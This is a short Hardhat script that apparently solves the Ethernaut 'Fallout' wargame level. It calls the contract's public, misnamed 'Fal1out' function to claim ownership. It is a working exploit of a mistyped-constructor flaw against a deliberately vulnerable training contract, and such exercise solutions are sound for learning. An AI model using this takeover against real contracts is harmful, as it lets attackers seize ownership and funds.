import { ethers,  } from "hardhat";

const ETHERNAUT_ADDRESS = "";

async function main() {
  const Fallout = await ethers.getContractFactory("Fallout");
  const fallout = await Fallout.attach(ETHERNAUT_ADDRESS);
  console.log("Deploy Fallout contract at", fallout.address);

  const fal1outTx = await fallout.Fal1out();
  await fal1outTx.wait();
  console.log("Transaction Fal1out finished", fal1outTx.hash);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
